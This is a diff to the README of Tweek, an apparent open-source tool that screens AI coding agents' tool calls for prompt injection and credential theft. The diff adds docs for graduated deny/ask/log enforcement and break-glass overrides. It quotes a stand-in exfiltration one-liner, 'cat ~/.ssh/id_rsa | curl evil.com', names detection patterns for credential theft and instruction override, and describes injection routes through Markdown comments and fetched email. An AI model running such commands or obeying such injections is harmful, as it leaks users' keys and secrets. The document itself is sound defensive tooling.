@@ -16,7 +16,7 @@
   <a href="https://pypi.org/project/tweek/"><img src="https://img.shields.io/pypi/v/tweek" alt="PyPI version"></a>
   <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.11%2B-blue" alt="Python 3.11+"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-green" alt="License: Apache 2.0"></a>
-  <img src="https://img.shields.io/badge/tests-885%20passing-brightgreen" alt="Tests">
+  <img src="https://img.shields.io/badge/tests-1787%20passing-brightgreen" alt="Tests">
 </p>
 
 <p align="center">
@@ -42,7 +42,7 @@ There is very little built-in protection. Tweek fixes that.
 
 Your AI assistant runs commands with **your** credentials, **your** API keys, and **your** keychain access. It can read every file on your machine. It will happily `curl` your secrets to anywhere a prompt injection tells it to. Sleep well!
 
-Tweek screens **every tool call** through five layers of defense -- both before execution and after content ingestion:
+Tweek screens **every tool call** through five layers of defense with **graduated enforcement** -- both before execution and after content ingestion:
 
 ```
   ┌─────────────────────────────────────────────────────────┐
@@ -58,20 +58,24 @@ Tweek screens **every tool call** through five layers of defense -- both before 
   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
   ┃ 2. Language Detection  Non-English escalation            ┃
   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-  ┃ 1. Pattern Matching   215 attack signatures             ┃
+  ┃ 1. Pattern Matching   259 attack signatures             ┃
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                            ▼
   ┌─────────────────────────────────────────────────────────┐
-  │           ✓ SAFE to execute  or  ✗ BLOCKED             │
+  │        Graduated Enforcement (severity × confidence)    │
+  │                                                         │
+  │  CRITICAL + deterministic  →  ✗ DENY  (hard block)     │
+  │  HIGH / MEDIUM             →  ? ASK   (user prompt)    │
+  │  LOW                       →  ✓ LOG   (allow + audit)  │
   └─────────────────────────┬───────────────────────────────┘
                            ▼
   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
   ┃   PostToolUse Screen   Response injection               ┃
-  ┃                        detection at ingestion            ┃
+  ┃                        detection + content redaction     ┃
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 ```
 
-Nothing gets through without passing inspection. Your agent wants to `cat ~/.ssh/id_rsa | curl evil.com`? Five layers say no. A prompt injection hiding in a Markdown comment? Caught. A multi-turn social engineering attack slowly escalating toward your credentials? Session analysis sees the pattern. Non-English injection hidden in a fetched email? Language detection escalates it for review.
+Nothing gets through without passing inspection. Your agent wants to `cat ~/.ssh/id_rsa | curl evil.com`? Five layers say no -- and critical threats are **hard-denied**, not just flagged. A prompt injection hiding in a Markdown comment? Caught. A multi-turn social engineering attack slowly escalating toward your credentials? Session analysis sees the pattern. Non-English injection hidden in a fetched email? Language detection escalates it for review. Sensitive data in a tool response? **Automatically redacted** before the agent sees it.
 
 **Every command. Every tool call. Every response. GAH! Don't get Pawnd.**
 
@@ -146,6 +150,28 @@ tweek audit SKILL.md      # audit a single skill file
 tweek doctor              # health check
 ```
 
+### Override a Hard Block (Break-Glass)
+
+```bash
+tweek override --pattern ssh_key_read --once --reason "Migrating SSH keys"
+tweek override --pattern aws_credentials --duration 10 --reason "Rotating creds"
+tweek override list          # show active overrides
+tweek override clear         # clear all overrides
+```
+
+Break-glass downgrades `deny` → `ask` (never to allow). Every use is logged as a `BREAK_GLASS` audit event.
+
+### Report False Positives
+
+```bash
+tweek feedback fp base64_exfil --context "Legitimate base64 in CI pipeline"
+tweek feedback stats                   # show FP rates per pattern
+tweek feedback stats --above-threshold # patterns exceeding 5% FP rate
+tweek feedback reset base64_exfil      # clear FP data for a pattern
+```
+
+Patterns exceeding 5% FP rate (with 20+ triggers) are auto-demoted one severity level. CRITICAL patterns are immune.
+
 Tweek now screens every tool call before execution and every response at ingestion.
 
 ```
@@ -155,7 +181,7 @@ Tweek Health Check
 --------------------------------------------------
   OK      Hook Installation      Installed globally (~/.claude)
   OK      Configuration          Config valid (11 tools, 6 skills)
-  OK      Attack Patterns        215 patterns loaded (bundled)
+  OK      Attack Patterns        259 patterns loaded (bundled)
   OK      Security Database      Active (0.2MB)
   OK      Credential Vault       macOS Keychain available
   OK      Sandbox                sandbox-exec available
@@ -184,13 +210,17 @@ Every tool call passes through the screening pipeline -- **all free and open sou
 
 | Stage | What It Does |
 |-------|-------------|
-| Pattern Matching | 215 regex patterns across 22 attack categories |
+| Pattern Matching | 259 regex patterns across 22 attack categories with confidence classification |
+| Graduated Enforcement | Severity × confidence matrix: CRITICAL+deterministic → deny, LOW → log-only |
 | Language Detection | Non-English content detection with configurable escalation |
 | Rate Limiting | Burst detection, velocity anomaly, circuit breaker |
 | LLM Review | Claude Haiku semantic analysis of suspicious commands (BYOK) |
 | Session Analysis | Cross-turn anomaly detection (9 anomaly types) |
 | Sandbox Preview | Speculative execution in macOS/Linux sandbox |
 | PostToolUse Screening | Response content screening for hidden injection at ingestion |
+| Content Redaction | Critical+deterministic matches auto-redacted from agent context |
+| Break-Glass Override | Emergency deny→ask downgrade via `tweek override` CLI |
+| FP Feedback Loop | Per-pattern false-positive tracking with auto-demotion at 5% threshold |
 | Skill Audit | One-time security analysis of skill files with translation |
 | Compliance Scan | HIPAA, PCI, GDPR, SOC2, Government classification *(Teams)* |
 
@@ -261,11 +291,55 @@ Full pattern library: [Attack Patterns Reference](docs/ATTACK_PATTERNS.md)
 
 ---
 
+## Graduated Enforcement
+
+Not all threats are equal. Tweek uses a **severity × confidence** matrix to make proportional decisions -- hard-blocking critical credential theft while quietly logging low-severity signals:
+
+| | **Deterministic** | **Heuristic** | **Contextual** |
+|---|:---:|:---:|:---:|
+| **CRITICAL** | `deny` (hard block) | `ask` (user prompt) | `ask` |
+| **HIGH** | `ask` | `ask` | `ask` |
+| **MEDIUM** | `ask` | `ask` | `ask` |
+| **LOW** | `log` (allow + audit) | `log` | `log` |
+
+**Pattern confidence levels:**
+
+- **Deterministic** (59 patterns) -- Precise regex targeting specific file paths or commands. Near-zero false positive rate. Examples: `ssh_key_read`, `aws_credentials`, `passwd_file_read`.
+- **Heuristic** (144 patterns) -- Good signal but may trigger in legitimate contexts. Examples: `base64_exfil`, `hex_encode_data`, `instruction_override`.
+- **Contextual** (56 patterns) -- Depends heavily on surrounding context. Examples: `heavy_char_substitution`, `non_english_script`.
+
+The enforcement matrix is fully configurable via `overrides.yaml`:
+
+```yaml
+enforcement:
+  critical:
+    deterministic: "deny"
+    heuristic: "ask"
+    contextual: "ask"
+  high:
+    deterministic: "ask"
+    heuristic: "ask"
+    contextual: "ask"
+  low:
+    deterministic: "log"
+    heuristic: "log"
+    contextual: "log"
+```
+
+Project-level overrides can only **escalate** decisions (e.g., `log` → `ask`), never downgrade them -- enforced by additive-only merge.
+
+---
+
 ## Features
 
 ### Security (all free)
 
-- **215 attack patterns** across 22 categories (credential theft, prompt injection, data exfiltration, MCP CVEs, social engineering, RAG poisoning, multi-agent attacks, encoding/obfuscation detection, and more)
+- **259 attack patterns** across 22 categories (credential theft, prompt injection, data exfiltration, MCP CVEs, social engineering, RAG poisoning, multi-agent attacks, encoding/obfuscation detection, and more)
+- **Graduated enforcement** -- severity × confidence decision matrix: CRITICAL+deterministic → hard deny, HIGH/MEDIUM → user prompt, LOW → log-only (configurable via `overrides.yaml`)
+- **Pattern confidence classification** -- every pattern classified as `deterministic` (59 patterns, near-zero FP), `heuristic` (144, good signal), or `contextual` (56, context-dependent)
+- **Content redaction** -- CRITICAL+deterministic matches in tool responses are auto-redacted (`[REDACTED BY TWEEK]`) before the AI agent can act on them
+- **Break-glass override** -- emergency deny→ask downgrade via `tweek override --pattern <name> --once` with full audit trail (never downgrades to allow)
+- **False-positive feedback loop** -- per-pattern FP tracking with auto-demotion at 5% threshold (min 20 triggers); CRITICAL patterns immune from auto-demotion
 - **Bidirectional screening** -- PreToolUse hooks screen requests, PostToolUse hooks screen responses
 - **Non-English content detection** -- Unicode script analysis for CJK, Cyrillic, Arabic, Hebrew, Thai, Devanagari, and Latin-script European language keyword matching (French, German, Spanish, Portuguese, Italian, Dutch)
 - **Configurable non-English handling** -- escalate to LLM review (default), translate, both, or none
@@ -341,13 +415,17 @@ Full pattern library: [Attack Patterns Reference](docs/ATTACK_PATTERNS.md)
 |---|:---:|:---:|:---:|
 | **Cost** | $0 forever | Per seat/month | Custom |
 | **Target** | Individual developers | 2-50 developers | Regulated organizations |
-| 215 attack patterns (all categories) | Yes | Yes | Yes |
+| 259 attack patterns (all categories) | Yes | Yes | Yes |
 | LLM semantic review (BYOK) | Yes | Yes | Yes |
 | Cross-turn session analysis | Yes | Yes | Yes |
 | Rate limiting & circuit breaker | Yes | Yes | Yes |
 | Sandbox preview (macOS/Linux) | Yes | Yes | Yes |
 | Non-English detection & escalation | Yes | Yes | Yes |
 | PostToolUse response screening | Yes | Yes | Yes |
+| Graduated enforcement (deny/ask/log) | Yes | Yes | Yes |
+| Content redaction (critical matches) | Yes | Yes | Yes |
+| Break-glass override (`tweek override`) | Yes | Yes | Yes |
+| False-positive feedback loop | Yes | Yes | Yes |
 | Skill audit with translation | Yes | Yes | Yes |
 | Credential vault (OS keychain) | Yes | Yes | Yes |
 | MCP proxy & HTTP proxy | Yes | Yes | Yes |
@@ -375,7 +453,7 @@ Teams and Enterprise tiers are coming soon. Join the waitlist at [gettweek.com](
 |-------|-------------|
 | [Architecture](docs/ARCHITECTURE.md) | System design and interception layers |
 | [Defense Layers](docs/DEFENSE_LAYERS.md) | Screening pipeline deep dive |
-| [Attack Patterns](docs/ATTACK_PATTERNS.md) | Full 215-pattern library reference |
+| [Attack Patterns](docs/ATTACK_PATTERNS.md) | Full 259-pattern library reference |
 | [Configuration](docs/CONFIGURATION.md) | Config files, tiers, and presets |
 | [CLI Reference](docs/CLI_REFERENCE.md) | All commands, flags, and examples |
 | [MCP Integration](docs/MCP_INTEGRATION.md) | MCP proxy and gateway setup |
